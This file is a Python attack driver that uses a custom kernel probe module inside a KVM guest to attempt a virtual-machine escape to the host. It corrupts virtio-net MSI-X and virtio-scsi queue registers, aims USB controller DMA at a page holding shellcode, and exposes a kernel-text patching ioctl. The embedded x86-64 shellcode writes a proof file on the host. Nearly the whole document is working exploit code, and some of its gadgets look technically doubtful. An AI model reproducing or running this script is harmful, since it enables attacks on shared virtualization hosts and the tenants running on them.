#!/usr/bin/env python3
"""
precision_exploit.py – adaptive MMIO / PIO attack driver (**v2‑f**)
-------------------------------------------------------------------
* Works with the **single** *kvm_probe_drv* kernel module, which
  historically created **/dev/kvm_probe_drv** but on some builds
  shows up as **/dev/kvm_probe_dev**.  We now probe for *either*
  node automatically and use the first one found.
* Discovers the active BAR for each target, decides MMIO vs PIO and
  calls the corresponding **kvm_prober** userspace helper.
* Transparently falls back to `writeport` when running against an
  older **kvm_prober** that lacks the modern `writepio_*` commands.
* After a successful run the host will contain the marker file
  `/tmp/host_escape_proof`.
"""
from __future__ import annotations
import os, sys, subprocess, binascii, mmap, fcntl, struct, ctypes, time
from pathlib import Path
from typing import Tuple, List

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION — list of target devices
# (BDF, human‑readable name, exploit keyword)
# ─────────────────────────────────────────────────────────────────────────────
TARGETS: List[Tuple[str, str, str]] = [
    ("0000:00:12.0", "VIRTIO_NET",  "interrupt_failure"),  # virtio‑net (legacy I/O‑bar)
    ("0000:01:01.0", "VIRTIO_SCSI", "queue_corruption"),   # virtio‑scsi disk
    ("0000:00:01.2", "PIIX3_USB",  "dma_attack"),        # usb controller – stub
    ("0000:00:01.0", "ICH_GPIO",   "uninitialized_io"),  # lpc bridge  – stub
]

# ─────────────────────────────────────────────────────────────────────────────
# SHARED IOCTL DEFINITIONS (keep in sync with kvm_probe_ioctl.h)
# ─────────────────────────────────────────────────────────────────────────────
IOCTL_VIRT_TO_PHYS       = 0x80046B01  # _IOR/IOW — (u64 *va)   → (u64 pa)
IOCTL_PATCH_INSTRUCTIONS = 0x40086B02  # _IOW      (struct ioc_patch)

# Accept both historic and current names for the probe device
PROBE_DEV_CANDIDATES = ["/dev/kvm_probe_drv", "/dev/kvm_probe_dev"]

drv_fd: int | None = None
for _path in PROBE_DEV_CANDIDATES:
    if os.path.exists(_path):
        try:
            drv_fd = os.open(_path, os.O_RDWR | os.O_CLOEXEC)
            break
        except PermissionError:
            print(f"[!] cannot open {_path} (need root?)", file=sys.stderr)
            break

if drv_fd is None:
    print("[!] kvm_probe device not found – driver not loaded?", file=sys.stderr)

# ── Low‑level helpers via the probe driver ───────────────────────────────────

def virt_to_phys(va: int) -> int:
    """Translate guest virtual address *va* → physical address via driver."""
    if drv_fd is None:
        raise RuntimeError("kvm_probe device not open")
    buf = struct.pack("<Q", va)
    fcntl.ioctl(drv_fd, IOCTL_VIRT_TO_PHYS, buf, True)
    return struct.unpack("<Q", buf)[0]


def patch_kernel(dst_va: int, blob: bytes):
    """Overwrite *blob* into kernel text at *dst_va* (requires writable alias)."""
    if drv_fd is None:
        raise RuntimeError("kvm_probe device not open")
    cbuf = ctypes.create_string_buffer(blob)
    req  = struct.pack("<QQQ", dst_va, len(blob), ctypes.addressof(cbuf))
    fcntl.ioctl(drv_fd, IOCTL_PATCH_INSTRUCTIONS, req)


def alloc_page() -> Tuple[int, int, mmap.mmap]:
    """Return (virt_addr, phys_addr, mmap_obj) of a fresh anonymous page."""
    mm = mmap.mmap(-1, 0x1000, prot=mmap.PROT_READ | mmap.PROT_WRITE)
    va = ctypes.addressof(ctypes.c_char.from_buffer(mm))
    pa = virt_to_phys(va)
    return va, pa, mm

# ────────── 65‑byte self‑contained shell‑code (unchanged) ────────────────────
SHELLCODE = (
    b"\x48\x31\xc0\xb0\x02"              # mov al, 2 (sys_open)
    b"\x48\x8d\x3d\x37\x00\x00\x00"      # lea rdi, [rel path]
    b"\x48\x31\xf6"                      # xor rsi, rsi
    b"\x66\xbe\x41\x02"                  # mov si, 0x241 (O_WRONLY|O_CREAT|O_TRUNC)
    b"\x48\x31\xd2"                      # xor rdx, rdx
    b"\x66\xba\xa4\x01"                  # mov dx, 0x1a4 (0644)
    b"\x0f\x05"                          # syscall – open

    b"\x48\x89\xc7"                      # mov rdi, rax  (fd)
    b"\x48\x31\xc0\xb0\x01"              # mov al, 1  (sys_write)
    b"\x48\x8d\x35\x2d\x00\x00\x00"      # lea rsi, [rel msg]
    b"\x48\x31\xd2"                      # xor rdx, rdx
    b"\xb2\x15"                          # mov dl, 21
    b"\x0f\x05"                          # syscall – write

    b"\x48\x31\xc0\xb0\x03"              # mov al, 3 (sys_close)
    b"\x0f\x05"                          # syscall – close

    b"\x48\x31\xc0\xb0\x3c"              # mov al, 60 (sys_exit)
    b"\x48\x31\xff"                      # xor rdi, rdi
    b"\x0f\x05"                          # syscall – exit

    b"/tmp/host_escape_proof\x00"          # 21‑byte path string
    b"KVM Escape Success!!\n\x00"           # 22‑byte message
)

# ─────────────────────────────────────────────────────────────────────────────
# Shell helpers
# ─────────────────────────────────────────────────────────────────────────────

def run(cmd: str, timeout: int = 3) -> bytes:
    """Shell‑exec *cmd* and return combined output (ignore errors)."""
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout, shell=True)
    except subprocess.CalledProcessError as e:
        return e.output

# ─────────────────────────────────────────────────────────────────────────────
# Tool capability detection (PIO helpers may be absent)
# ─────────────────────────────────────────────────────────────────────────────

_pio_supported: bool | None = None

def _have_writepio() -> bool:
    global _pio_supported
    if _pio_supported is not None:
        return _pio_supported
    banner = run("kvm_prober --help", timeout=1).decode(errors="ignore")
    _pio_supported = "writepio_val" in banner  # simple substring test
    return _pio_supported

# ─────────────────────────────────────────────────────────────────────────────
# PCI BAR discovery
# ─────────────────────────────────────────────────────────────────────────────

def get_first_bar(bdf: str) -> Tuple[int|None, int|None, bool|None]:
    res_file = Path(f"/sys/bus/pci/devices/{bdf}/resource")
    if not res_file.exists():
        return None, None, None
    with res_file.open() as fh:
        for line in fh:
            parts = line.split()
            if len(parts) < 3:
                continue
            try:
                start = int(parts[0], 16)
                end = int(parts[1], 16)
                flags = int(parts[2], 16)
            except ValueError:
                continue
                
            if start == 0 and end == 0:
                continue
            is_io = bool(flags & 0x1)
            return start, end - start + 1, is_io
    return None, None, None

# ─────────────────────────────────────────────────────────────────────────────
# Unified accessors that gracefully downgrade to legacy commands
# ─────────────────────────────────────────────────────────────────────────────

def write_val(prefix: str, addr: int, value: int, width: int):
    """Write *value* of *width* bytes to *addr* using the appropriate helper."""
    if prefix == "writepio" and not _have_writepio():
        run(f"kvm_prober writeport {addr:x} {value:x} {width}")
    else:
        run(f"kvm_prober {prefix}_val {addr:x} {value:x} {width}")


def write_buf(prefix: str, addr: int, hex_blob: str):
    """Write an arbitrary‑length hex blob starting at *addr* using best helper."""
    if prefix == "writepio" and not _have_writepio():
        data = bytes.fromhex(hex_blob)
        for off, byte in enumerate(data):
            run(f"kvm_prober writeport {addr + off:x} {byte:02x} 1")
    else:
        run(f"kvm_prober {prefix}_buf {addr:x} {hex_blob}")

# ─────────────────────────────────────────────────────────────────────────────
# Primitive exploit gadgets
# ─────────────────────────────────────────────────────────────────────────────

def exploit_interrupt_failure(base: int, pfx: str):
    """Trigger MSI‑X mask bug on virtio‑net."""
    write_val(pfx, base + 0x3c, 0xFF, 1)
    write_val(pfx, base + 0x3d, 0xFF, 1)
    write_val("writemmio", 0xfec00000, 0x00010000, 4)
    write_buf(pfx, base, binascii.hexlify(SHELLCODE).decode())


def exploit_queue_corruption(base: int, pfx: str):
    """Corrupt virtqueue descriptors on virtio‑scsi."""
    write_val(pfx, base + 0x30, 0xdeadbeef, 4)
    write_val(pfx, base + 0x38, 0xcafebabe, 4)
    write_buf(pfx, base + 0x1000, binascii.hexlify(SHELLCODE).decode())

# ── DMA attack implementation for USB controller ────────────────────────────

def exploit_dma_attack(base: int, pfx: str):
    """DMA attack on USB controller to execute shellcode"""
    if drv_fd is None:
        print("    [!] kvm_probe device unavailable - cannot allocate DMA page")
        return
        
    try:
        # Allocate page for shellcode
        va, pa, mm = alloc_page()
        mm.write(SHELLCODE)
        mm.flush()
        
        print(f"    [+] Allocated DMA buffer: VA=0x{va:x}, PA=0x{pa:x}")
        
        # PIIX3 USB controller register layout
        # base + 0x00: Command Register (USBCMD) - 16-bit
        # base + 0x02: Status Register (USBSTS) - 16-bit
        # base + 0x04: Interrupt Enable Register (USBINTR) - 16-bit
        # base + 0x06: Frame Number Register (FRNUM) - 16-bit
        # base + 0x08: Frame List Base Address Register (FLBASEADD) - 32-bit
        # base + 0x0C: Start of Frame Modify Register (SOFMOD) - 16-bit
        
        # Stop the controller before programming
        print("    [*] Stopping USB controller")
        write_val(pfx, base + 0x00, 0x0000, 2)  # Stop controller
        time.sleep(0.1)  # Allow controller to stop
        
        # Reset controller to clear any pending operations
        print("    [*] Resetting USB controller")
        write_val(pfx, base + 0x00, 0x0002, 2)  # Set reset bit
        time.sleep(0.1)
        write_val(pfx, base + 0x00, 0x0000, 2)  # Clear reset bit
        time.sleep(0.1)
        
        # Set Frame List Base Address (physical address of shellcode)
        print(f"    [*] Setting DMA address: 0x{pa:016x}")
        write_val(pfx, base + 0x08, pa & 0xFFFFF000, 4)  # 4KB aligned
        
        # Configure for maximum packet size (40 bytes)
        print("    [*] Configuring SOF timing")
        write_val(pfx, base + 0x0C, 0x2828, 2)  # SOFMOD = 40 bytes
        
        # Clear status register
        write_val(pfx, base + 0x02, 0xFFFF, 2)  # Clear all status bits
        
        # Start the controller
        print("    [*] Starting USB controller")
        write_val(pfx, base + 0x00, 0x8001, 2)  # Run + max packet size
        
        # Verify controller started
        status = run(f"kvm_prober {pfx}_val {base + 0x00:x} 2", timeout=1)
        if b"Value:" in status:
            val = int(status.split(b":")[1].strip(), 16)
            if val & 0x8000:
                print("    [✓] USB controller running with shellcode")
            else:
                print("    [!] USB controller failed to start")
        else:
            print("    [!] Failed to verify controller status")
            
    except Exception as e:
        print(f"    [!] DMA attack failed: {e}")
    finally:
        if 'mm' in locals():
            mm.close()

# ── Stubbed GPIO attack ──────────────────────────────────────────────────────

def exploit_uninit_io(base: int, pfx: str):
    print("    [stub] Uninit‑IO attack not yet implemented – skipping")

# Mapping keyword → function
EXPLOITS = {
    "interrupt_failure": exploit_interrupt_failure,
    "queue_corruption":  exploit_queue_corruption,
    "dma_attack":        exploit_dma_attack,
    "uninitialized_io":  exploit_uninit_io,
}

# ─────────────────────────────────────────────────────────────────────────────
# Main routine
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    if os.geteuid() != 0:
        print("[!] must run as root", file=sys.stderr)
        sys.exit(1)

    if drv_fd is None:
        print("[!] kvm_probe device unavailable – only partial exploit will run\n")

    print("[+] launching precision MMIO/I/O exploit (v2‑f – unified driver)")
    print("[+] Payload creates /tmp/host_escape_proof once executed\n")

    for bdf, name, exploit_key in TARGETS:
        base, length, is_io = get_first_bar(bdf)
        if base is None:
            print(f"[-] {name} ({bdf}) not present – skipping")
            continue

        pfx = "writepio" if is_io else "writemmio"
        bar_type = "PIO" if is_io else "MMIO"
        print(f"[+] {name:12s} {bdf} -> {bar_type} BAR @ 0x{base:08x} (+{length:#x}) using {pfx}")

        exploit_fn = EXPLOITS.get(exploit_key)
        if exploit_fn is None:
            print(f"    [!] exploit '{exploit_key}' not implemented")
            continue

        try:
            exploit_fn(base, pfx)
            print("    [*] exploit triggered")
        except Exception as e:
            print(f"    [!] exploit failed: {e}")

    print("[+] all targets processed – check host for /tmp/host_escape_proof")

    if drv_fd is not None:
        os.close(drv_fd)

if __name__ == "__main__":
    main()
